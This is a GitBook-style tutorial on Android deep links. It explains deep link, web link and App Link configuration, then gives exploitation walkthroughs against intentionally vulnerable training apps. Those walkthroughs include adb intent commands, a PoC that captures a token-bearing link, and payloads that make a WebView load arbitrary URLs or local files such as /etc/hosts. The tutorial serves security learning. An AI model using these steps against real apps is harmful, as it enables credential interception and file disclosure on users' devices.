---
cover: ../.gitbook/assets/What-is-Mobile-Deep-Linking-Header.webp
coverY: 123.56266666666666
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Deep Links Hacking

### Resources

{% embed url="https://medium.com/@Sisi0x/android-deep-links-exploit-with-3-apps-6f604d288318" %}

{% embed url="https://deepstrike.io/blog/full-account-takeover-deeplinks" %}

{% embed url="https://developer.android.com/training/app-links" %}

### Types of Deep Links

<figure><img src="../.gitbook/assets/image (2).png" alt="" width="275"><figcaption></figcaption></figure>

### 1. Deep Links

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Definition:** Handles URIs in the form of `scheme://authority/path`.

* **Scheme:** Can be standard (e.g., `http`, `https`) or custom (e.g., `app://`).
* **Authority:** Should have a domain structure to clarify ownership.
* **Path:** Directs the user to a particular activity based on app logic.

**Example:**

```xml
<activity
    android:name=".DeepLinkActivity"
    android:exported="true"
    android:label="DeepLink">
    <intent-filter android:label="filter_view_example_vaadata">
        <action android:name="android.intent.action.VIEW" />

        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />

        <data android:scheme="vaadata" />
        <data android:host="test" />
        <data android:path="/hello"/>
    </intent-filter>
</activity>
```

Here, the “DeepLinkActivity” will be able to open links of type `vaadata://test/hello`, `vaadata://test/hello?test=1` or `vaadata://test/hello?a=1&test=coucou`.

Sample Link:

* Instagram: `instagram://media?id=123456789`
* Spotify: `spotify:track:123456789`
* Facebook: `fb://page?id=123456789`

### 2. Web Links

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* **Definition:** Deep links that use the `HTTP` and `HTTPS` schemes..
* **Characteristics:** Standard web URLs that redirect to specific app content.
* **Implementation:**

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />

    <data android:scheme="http" />
    <data android:host="myownpersonaldomain.com" />
</intent-filter>
```

```
http://myownpersonaldomain.com/path/to/resource
```

* **Behavior:** On Android 12+, always opens in a web browser. On older versions, may display a disambiguation dialog.

### 3. Android App Links

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* **Definition:** Web links that use the `HTTP` and `HTTPS` schemes and contain the `autoVerify` attribute.
*   **Implementation:**

    ```xml
    xmlCopy code<intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="http" />
        <data android:scheme="https" />
        <data android:host="myownpersonaldomain.com" />
    </intent-filter>
    ```
* **Benefits:**
  * **Secure and Specific:** Links to a website domain you own.
  * **Seamless User Experience:** Users without the app go to the website.
  * **Android Instant Apps Support:** Users can run your app without installing it.
  * **Engage Users from Google Search:** Opens specific content in your app from Google search results.

### Steps to Add Android App Links

#### 1. Create Deep Links

* **Add intent filters:** Configure your app to use data from intents to direct users to the right content.
*   **Example:**

    ```xml
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="http" />
        <data android:host="example.com" />
    </intent-filter>
    ```

#### 2. Add Verification for Your Deep Links

* **Configure verification:** Request verification of app links and publish a Digital Asset Links JSON file on your website. (e.g https://evil.com/.well-known/assetlinks.json)
*   **Example:**

    ```json
    {
        "relation": ["delegate_permission/common.handle_all_urls"],
        "target": {"namespace": "android_app", "package_name": "com.example.app", "sha256_cert_fingerprints": ["..."]}
    }
    ```

#### 3. Use Android App Links Assistant

* **Tool in Android Studio:** Guides you through the steps required to create Android App Links.

***

### Exploitation of Deep Links

### App 1: DeepLin-app

**Step 1:** Decompile the app using tools like Jadx.

*   **Command:**

    ```bash
    jadx -d output_folder DeepLin-app.apk
    ```

**Step 2:** Open `AndroidManifest.xml` to identify intent filters.

**Found Intent Filter:**

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="holiday"/>
</intent-filter>
```

**Exploit via adb:**

```bash
adb shell am start -a android.intent.action.VIEW -d "holiday://whatever.login/test?token=2100537c6456cd8a437f7734fad189a8"
```

**Exploit via PoC:**

```java
Uri deepLinkURL = getIntent().getData(); 
System.out.println("Credentials: " + deepLinkURL.toString());
```

**In `AndroidManifest.xml`:**

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="holiday"/>
</intent-filter>
```

### App 2: BeetleBug

**Step 1:** Decompile the app using tools like Jadx.

*   **Command:**

    ```bash
    jadx -d output_folder BeetleBug.apk
    ```

**Step 2:** Open `AndroidManifest.xml` to identify intent filters.

**Found Intent Filter:**

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https" android:host="beetlebug.com" android:pathPrefix="/account"/>
</intent-filter>
```

**Exploit via adb:**

```bash
adb shell am start -a android.intent.action.VIEW -d "https://beetlebug.com/account"
```

### App 3: InsecureShop

**Step 1:** Decompile the app using tools like Jadx.

*   **Command:**

    ```bash
    jadx -d output_folder InsecureShop.apk
    ```

**Step 2:** Open `AndroidManifest.xml` to identify intent filters.

**Found Intent Filter:**

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="insecureshop"/>
</intent-filter>
```

**Exploit via adb to load arbitrary URL:**

```bash
adb shell am start -a android.intent.action.VIEW -d 'insecureshop://com.insecureshop/web?url=http://example.com'
```

**Exploit via adb to read system files:**

```bash
adb shell am start -a android.intent.action.VIEW -d 'insecureshop://com.insecureshop/web?url=file:///etc/hosts'
```

**Code Snippet with Vulnerabilities:**

```java
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);

Uri uri = getIntent().getData();
if (uri != null) {
    String url = uri.getQueryParameter("url");
    if (url != null) {
        webView.loadUrl(url);
    }
}
```
